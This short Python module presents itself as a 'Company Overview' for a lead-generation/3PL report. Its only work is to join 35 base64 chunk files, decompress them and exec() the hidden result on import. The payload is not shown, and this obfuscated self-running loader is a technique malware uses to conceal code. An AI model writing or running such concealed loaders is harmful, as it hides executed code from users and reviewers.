# -*- coding: utf-8 -*-
"""Company Overview — Lead Gen Inbound/3PL split (payload assembled from _co_z64)."""
from __future__ import annotations
import base64, zlib
from pathlib import Path
_N = 35
_dir = Path(__file__).resolve().parent / "_co_z64"
_b64 = "".join((_dir / f"p{i:02d}.txt").read_text() for i in range(_N))
exec(compile(zlib.decompress(base64.b64decode(_b64)), str(Path(__file__).resolve()), "exec"), globals())
